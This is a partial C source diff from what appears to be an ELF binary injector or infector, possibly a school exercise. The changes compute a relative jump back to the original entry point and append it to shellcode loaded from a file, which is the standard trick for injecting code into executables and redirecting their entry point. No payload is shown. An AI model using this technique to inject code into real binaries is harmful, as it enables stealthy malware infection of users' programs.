@@ -12,10 +12,17 @@ typedef struct  s_file {
   Elf64_Ehdr  *header;
 }               t_file;
 
-static t_file patchShellcode(t_file shellcode) {
-  char  ins[] = {0xe9, 0xfb, 0xff, 0xff, 0xff};
+static t_file patchShellcode(t_file shellcode, size_t oldE_entry, size_t e_entry) {
+  size_t  address;
+  char  ins[5];
   char  *header;
 
+  address = -(e_entry - oldE_entry + 1);
+  ins[0] = 0xe9;
+  ins[1] = (address >> 0) & 0xff;
+  ins[2] = (address >> 8) & 0xff;
+  ins[3] = (address >> 16) & 0xff;
+  ins[4] = (address >> 24) & 0xff;
   header = mmap(NULL, shellcode.size + 5, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
   memcpy(header, shellcode.header, shellcode.size);
   memcpy(header + shellcode.size, ins, 5);
@@ -25,7 +32,7 @@ static t_file patchShellcode(t_file shellcode) {
   return (shellcode);
 }
 
-static t_file getShellcode(void) {
+static t_file getShellcode(size_t oldE_entry, size_t e_entry) {
   int         fd;
   struct stat stats;
   t_file      shellcode;
@@ -36,8 +43,7 @@ static t_file getShellcode(void) {
   fd = open("shellcode", O_RDONLY);
   shellcode.header = mmap(NULL, shellcode.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
   close(fd);
-  return shellcode;
-  return (patchShellcode(shellcode));
+  return (patchShellcode(shellcode, oldE_entry, e_entry));
 }
 
 static int  appendShellcode(t_file *bin, t_file shellcode) {
@@ -59,7 +65,7 @@ static int  makeNew(t_file *bin) {
   Elf64_Phdr  *segment;
   t_file      shellcode;
 
-  shellcode = getShellcode();
+  shellcode = getShellcode(bin->header->e_entry, 0xc000000 + bin->size);
   if (appendShellcode(bin, shellcode) == -1)
     return (-1);
   segment = ((void *)bin->header) + bin->header->e_phoff;
